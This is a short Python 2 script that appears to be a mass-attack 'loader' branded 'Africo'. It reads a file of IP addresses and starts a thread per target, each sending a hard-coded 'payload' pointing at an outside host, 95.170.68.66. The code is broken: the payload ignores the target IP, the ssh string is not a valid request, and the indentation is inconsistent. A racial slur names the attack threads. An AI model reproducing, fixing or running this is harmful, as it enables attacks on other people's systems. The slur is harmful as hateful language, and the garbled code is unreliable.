#! python !#
import threading, sys, time, re, os, requests
if len(sys.argv) < 2:
    print "\033[37mUsage: python "+sys.argv[0]+" list of ips \033[37m"
    sys.exit()

serverip = "IP"  
mip = "mips" 
ips = open(sys.argv[1], "r").readlines()
class afr(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print("\033[1;33m[\033[1;33mAfrico\033[1;33m] Sending: \033[1;33m-> \033[1;33m%s") % (self.ip)
				payload = "ssh anonymous@95.170.68.66:909"
                                payload1 = "ssh anonymous@95.170.68.66:909"
	                	requests.get(payload, timeout=5)
				requests.get(payload1, timeout=5)
        		except:
            		    pass
 
for ip in ips:
	try:
		fuckingnigger = afr(ip)
		fuckingnigger.start()
	except:
		pass
